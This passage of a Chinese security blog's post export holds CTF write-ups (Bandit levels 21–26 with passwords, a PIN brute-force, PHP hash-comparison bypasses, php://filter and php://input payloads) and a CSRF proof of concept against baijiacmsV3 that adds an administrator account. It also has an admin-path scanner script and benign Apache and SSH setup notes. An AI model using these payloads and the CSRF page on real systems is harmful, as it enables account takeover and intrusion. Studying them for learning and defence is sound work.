cronjob_bandit24-rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contestbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI cron指Linux系统下一个自动执行指定任务的程序（计划任务），” bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null” 中的”“表示每分钟执行一次这个脚本，再用cat查询该脚本的内容，不停把/etc/bandit_pass/bandit22文件内容（即下一关的密码）写入/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv，并且更改了权限。 密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level 22→ Level 23用账号：bandit22，密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI进入本关 描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本有意使其易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看它打印的调试信息。 过程： 123456789101112131415161718192021222324252627bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x 2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit22-rw-r--r-- 1 root root 122 Dec 28 14:34 cronjob_bandit23-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit24-rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contestbandit22@bandit:/etc/cron.d$ cat -n cronjob_bandit23 1 @reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null 2 * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh # !/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n 直接赋值执行。 密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Level 23→ Level 24用账号：bandit23，密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n进入本关 描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：此级别要求您创建自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到自豪！ 注2：请记住，你的shell脚本一旦被执行就被删除，所以你可能想保留一份副本…… 过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647bandit23@bandit:~$ cd /etc/cron.dbandit23@bandit:/etc/cron.d$ lscronjob_bandit22 cronjob_bandit23 cronjob_bandit24 popularity-contestbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho "Executing and deleting all scripts in /var/spool/$myname:"for i in * .*;do if [ "$i" != "." -a "$i" != ".." ]; then echo "Handling $i" timeout -s 9 60 ./$i rm -f ./$i fidonebandit23@bandit:/etc/cron.d$ mkdir /tmp/crayon bandit23@bandit:/etc/cron.d$ cd /tmp/crayonbandit23@bandit:/tmp/crayon$ vim bandit24.shbandit23@bandit:/tmp/crayon$ cat bandit24.sh #!/bin/bashcat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/crayon/level24bandit23@bandit:/tmp/crayon$ chmod 777 bandit24.sh bandit23@bandit:/tmp/crayon$ cp bandit24.sh /var/spool/bandit24/bandit23@bandit:/tmp/crayon$ chmod 777 /tmp/crayonbandit23@bandit:/tmp/crayon$ ls /var/spool/bandit24/ls: cannot open directory '/var/spool/bandit24/': Permission deniedbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.sh# 等一会儿就有了bandit23@bandit:/tmp/crayon$ lsbandit24.sh level24bandit23@bandit:/tmp/crayon$ cat level24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 在/tmp/文件夹中创建一个目录。创建一个shell脚本将/etc/bandit_pass /bandit24复制到我们的/tmp/文件夹。将shell脚本复制到/var/spool/bandit24/。给shell脚本和/tmp/文件夹适当的权限。/usr/bin/cronjob_bandit24.sh这个shell的作用就是执行 /var/spool/bandit24 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 /etc/bandit_pass/bandit24/ 输出到 /tmp/crayon的脚本到这个目录下，然后付了个权限。 密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level 24→ Level 25用账号：bandit24，密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ进入本关 描述：守护进程正在端口30002上侦听，并且如果给出bandit24的密码和一个秘密的数字4位pincode，它会给你bandit25的密码。没有办法检索pincode，除非通过所有10000个组合，称为暴力。 过程： 1234bandit24@bandit:~$ nc localhost 30002I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234Wrong! Please enter the correct pincode. Try again. 大概就是要写一个脚本了，10000种组合 123456789101112131415161718bandit24@bandit:~$ clearbandit24@bandit:~$ cd /tmp/crayonbandit24@bandit:/tmp/crayon$ vim data.pybandit24@bandit:/tmp/crayon$ cat data.py # !/usr/bin/env pythonf = open(&apos;crayon.txt&apos;,&apos;w&apos;)passwd = &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;for id in range(10000): data =passwd + &quot; &quot; + str(id).zfill(4) + &apos;\n&apos; f.write(data)f.close()bandit24@bandit:/tmp/crayon$ python data.py bandit24@bandit:/tmp/crayon$ lsbandit24.sh crayon.txt data.py level24bandit24@bandit:/tmp/crayon$ 生成一个名为crayon.txt的字典 123UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001。。。。。。UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999 12345678bandit24@bandit:/tmp/crayon$ nc localhost 30002 &lt; /tmp/crayon/crayon.txt &gt; /tmp/crayon/password.txtbandit24@bandit:/tmp/crayon$ sort /tmp/crayon/password.txt | uniq -uCorrect!Exiting.I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzGbandit24@bandit:/tmp/crayon$ 密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Level 25→ Level 26用账号：bandit25，密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG进入本关 描述：从bandit25登录bandit26应该相当简单…用户bandit26的shell不是/ bin / bash，而是别的。了解它是什么，它是如何工作的以及如何摆脱它。 过程： 1234567891011121314151617bandit25@bandit:~$ lsbandit26.sshkeybandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkeyCould not create directory &apos;/home/bandit25/.ssh&apos;.The authenticity of host &apos;localhost (127.0.0.1)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yes。。。。。。。。。。。。 _ _ _ _ ___ __ | | | (_) | |__ \ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | &apos;_ \ / _` | &apos;_ \ / _` | | __| / / &apos;_ \ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ Connection to localhost closed.bandit25@bandit:~$ 刚连上去就被关闭了。 12345678910bandit25@bandit:~$ cat /etc/passwd | grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat /usr/bin/showtext# !/bin/shexport TERM=linuxmore ~/text.txtexit 0 more 命令是一次显示一屏文字，然后左下角会显示一个 more 和当前显示了百分之多少， 之前在其他登陆中不曾见过，想必就是 more 命令显示的 text.txt 的内容，因为行数足以一屏显示完，所以没有显示 more 就没有显示，我们的思路就在 more 的这个特点上。我们要让他卡在一屏读不完的位置，也就是让你的终端高度读不下6行（字符画高度）， 这样我们可以在 more 的状态下通过一些特性执行命令找到我们下一关的密码 先把窗口缩到足够小，然后通过密钥连接 看到More后按V进入编辑模式 然后使用命令 :ex! /etc/bandit_pass/bandit26 打开我们需要的密码文件 只想说长知识了，没想到还能这么玩 密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level 26 → Level 2727级还不存在 gameover。。。。。。 有问题请留言]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[baijiacmsV3 CSRF add admin]]></title>
    <url>%2F2018%2F04%2F20%2FbaijiacmsV3-CSRF-add-admin%2F</url>
    <content type="text"><![CDATA[baijiacmsV3 CSRF add admin There is a CSRF vulnerability that can add the administrator accountAfter the administrator logged in,open the following one page. POC: 123456789101112131415&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://localhost/baijiacmsV3-master/index.php?mod=site&amp;op=edituser&amp;name=manager&amp;do=user" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="id" value="" /&gt; &lt;input type="hidden" name="username" value="hack" /&gt; &lt;input type="hidden" name="is&amp;#95;admin" value="1" /&gt; &lt;input type="hidden" name="store" value="0" /&gt; &lt;input type="hidden" name="newpassword" value="123123" /&gt; &lt;input type="hidden" name="confirmpassword" value="123123" /&gt; &lt;input type="hidden" name="submit" value="&amp;#32;�&amp;#143;&amp;#144;&amp;#32;浜&amp;#164;&amp;#32;" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; For example:]]></content>
  </entry>
  <entry>
    <title><![CDATA[python后台扫描脚本]]></title>
    <url>%2F2018%2F04%2F19%2Fpython%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[python 后台扫描脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# -*- coding:utf-8 -*-import urllibimport timeimport threadingurl = raw_input("输入你要扫描的网址:")txt = raw_input("输入字典(php.txt):")# 保存存在的后台地址open_url = []all_url = []# 建立线程列表threads = []# 从字典中读取每一行与url组合，然后添加到all_urldef search_url(url,txt): with open(txt,'r') as f: for each in f: each = each.replace('\n','') urllist = url + each all_url.append(urllist)# 处理urldef handle_url(urllist): print ("查找："+urllist+'\n') try: req = urllib.urlopen(urllist) # 判断返回码 if req.getcode() == 200: open_url.append(urllist) if req.getcode() == 301: open_url.append(urllist) except: pass# 主函数def main(): search_url(url,txt) # 多线程处理 for each in all_url: t = threading.Thread(target= handle_url, args=(each,)) threads.append(t) t.start() # 线程等待 for t in threads: t.join() # 扫描成功和不成功的回显 if open_url: print ("扫描成功，网站后台地址为：") for each in open_url: print ("[+]"+each) else: print ("没有扫到网站后台，字典不给力啊")if __name__ =="__main__": # 判断运行时间 start = time.clock() main() end = time.clock() print ("The function spend time is %.3f seconds" %(end-start))]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php可变变量]]></title>
    <url>%2F2018%2F04%2F18%2Fphp%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[什么叫可变变量将一个变量的内容作为另一个变量的名称，在php中这个需求可以通过可变变量（Variable variables）来实现。 就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： 123&lt;?php$a = 'hello';?&gt; 一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 hello 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如： 123&lt;?php$$a = 'world';?&gt; 这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句： 123&lt;?phpecho "$a $&#123;$a&#125;";?&gt; 与以下语句输出完全相同的结果： 123&lt;?phpecho "$a $hello";?&gt; 它们都会输出：hello world。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apach htpasswd开启目录访问认证]]></title>
    <url>%2F2018%2F04%2F18%2Fapach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[htpasswd建立和更新存储用户名、密码的文本文件， 用于对HTTP用户的basic认证 htpasswd命令参数12345678-c：创建一个加密文件；-n：不更新加密文件，只将加密后的用户名密码显示在屏幕上； -m：默认采用MD5算法对密码进行加密； -d：采用CRYPT算法对密码进行加密； -p：不对密码进行进行加密，即明文密码； -s：采用SHA算法对密码进行加密； -b：在命令行中一并输入用户名和密码而不是根据提示输入密码； -D：删除指定的用户。 开启目录验证假设apache的根目录是/usr/local/apache/，htpasswd位于Apache的bin目录 1.建立用户1htpasswd -c /root/.htpasswd admin 其中 .htpasswd 是存储账户密码的文件 admin是用户名 系统会要求您输入两遍密码 2.编辑httpd.conf在httpd.conf里加入如下几句代码 123456&lt;Directory &quot;/data/www/test.com/test/&quot;&gt; AuthType basic AuthName &quot;Authorization &quot; AuthUserFile /root/.htpasswd Require user cnsecer&lt;/Directory&gt; 其中”/data/www/test.com/test/ “就是要权限访问的目录 AuthUserFile 放存账户密码的文件Require user 后紧跟 允许访问的用户名 3.重启 apache1service httpd restart 使用.htaccess配置文件对目录设置密码保护教程1、使用apache htpasswd.exe创建密码文件，命令请看PHP推荐教程：apache htpasswd命令用法详解 2、在需要保护的目录下创建创建.htaccess配置文件（比如：/www/manage） 3、在.htaccess配置文件中的写入配置信息，.htaccess配置文件的写法与apache配置文件有所不同，没有Directory 1vim .htaccess 1234AuthType BasicAuthName &quot;WORKING CENTER&quot; #引号中的是说明文字，随便写AuthUserFile /etc/.passwd #AuthUserFile指的是保存用户名和密码的文件位置(绝对路径)Require like likeli #用户名为like，密码为likeli（如果这行写为Require valid-user表示指定只有.htpasswd文件包含的合法用户才能访问。） 4、保存.htaccess配置文件，并将.htaccess配置文件放置 在需要设置密码保护的目录下，比如/data/www/XXXX目录 上述.htaccess配置功能与第一种方法实现的功能是一样的。 这时浏览加密的网站就需要输入用户名密码了。 .htaccess配置注意事项除了和apache httpd.conf配置一样需要注意的那些问题之外，容易出现的一个错误是如果配置不正确，会出现.htaccess配置文件不起作用的问题，这是因为apache AllowOverride指令，决定了你的.htaccess是否能正常开启并启用。从安全性考虑，apache httpd.conf配置文件中网站根目录的AllowOverride属性一般都配置成不允许任何Override ，即 123&lt;Directory /&gt;AllowOverride None&lt;/Directory&gt; 所以要使apache能够正常的读取.htaccess文件的内容，开启.htaccess功能，使.htaccess配置文件中的设置起作用，就必须对网站根目录或者.htaccess 所在目录进行配置，将AllowOverride None更改为AllowOverride All。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sha1和md5函数漏洞]]></title>
    <url>%2F2018%2F04%2F18%2Fsha1%E5%92%8Cmd5%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[sha1函数和md5函数比较绕过在CTF比赛中经常遇到利用sha1()和md5()函数漏洞的题，先看一段代码： 123456789101112 &lt;?php require 'flag.php'; if (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) print 'Your password can not be your name.'; else if (sha1($_GET['name']) == sha1($_GET['password'])) die('Flag: '.$flag); else print '&lt;p class="alert"&gt;Invalid password.&lt;/p&gt;'; &#125; ?&gt; GET了两个参数name和password，获得flag要求的条件是：name != password &amp; sha1(name) == sha1(password) 此时就可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如： name[]=a&amp;password[]=b 这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。 经验证md5()函数同样存在此漏洞。 md5加密相等绕过题目代码： 123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo "flag&#123;*&#125;";&#125; else &#123;echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 输入的参数不等于QNKCDZO，但是md5(&#39;QNKCDZO&#39;)==md5($a) md5(‘QNKCDZO ‘)=0e830400451993494058024219903391 而0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0 如果md5 是以 0e 开头，在做比较的时候，便可以用这种方法绕过 123456md5(s878926199a)=0e545993274517709034328855841020md5(s155964671a)=0e342768416822451524974117254469md5(s214587387a)=0e848240448830537924465865611904md5(s1091221200a)=0e940624217856561557816327384675md5(s1885207154a)=0e509367213418206700842008763514md5(s1502113478a)=0e861580163291561247404381396064 以上这些都可以使用 解题方法： GET请求：?a=s878926199a 即可获得flag]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos更改ssh端口]]></title>
    <url>%2F2018%2F04%2F18%2Fcentos%E6%9B%B4%E6%94%B9ssh%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[修改ssh配置文件，添加端口vim /etc/ssh/sshd_config 将#Port 22的注释去掉并且换行加入Port 22333 如果是不是增加，而是修改端口的话，建议先保留22端口，等新端口可以登录再去掉。建议使用大端口，比如10000~65535以上。 重启SSH服务 /etc/init.d/sshd restart 或 systemctl restart sshd.service 防火墙开启22333端口vi /etc/sysconfig/iptables 加入 -A INPUT -m state –state NEW -m tcp -p tcp –dport 443 -j ACCEPT 重启防火墙 /etc/init.d/iptables restart 或 systemctl restart iptables.service 尝试所修改的端口能否正常连接 屏蔽默认端口确认新端口可以使用后最好能屏蔽掉默认的22号端口 vi /etc/sysconfig/iptables 在 -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT 前加#号注释掉 重启防火墙 成功！]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php伪协议-php://]]></title>
    <url>%2F2018%2F04%2F15%2Fphp%E4%BC%AA%E5%8D%8F%E8%AE%AE-php%2F</url>
    <content type="text"><![CDATA[php伪协议php伪协议，事实上是其支持的协议与封装协议。而其支持的协议有： file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 本编文章探讨php://协议 php://协议使用条件：不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。 php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 php://filter用于读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 php://filter在双off的情况下也可以正常使用； php.ini中 allow_url_fopen ：off/on allow_url_include：off/on demo：以BugKu中的一道题为例子 题目：flag在index里 根据题目已经知道flag就在index.php文件里，所以就用PHP://filter读取index.php http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 然后进行Base64解码就得到flag php://inputphp://input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传进去的参数作为文件名变量去打开文件时，可以将参数php://input，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取 allow_url_fopen ：off/on allow_url_include：on demo：以BugKu中的一道题为例子 题目：welcome to bugkuctf 查看源码后分析 123456789101112&lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php &#125;else&#123; echo &quot;you are not admin ! &quot;; &#125; --&gt; 明白了: get方式传递三个参数 存在$user 读取的$user文件内容===welcome to the bugkuctf $file要求为hint.php 于是想到了PHP://filter与php://input 于是构造payload http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password= 同时post data填入welcome to the bugkuctf，成功得到源码 此题就不往下拓展了，只是弄明白PHP://filter与php://input php://stdin, php://stdout 和 php://stderrphp://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 注意 PHP 在这方面的行为有很多 BUG 直到 PHP 5.2.1。 推荐你简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。 php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
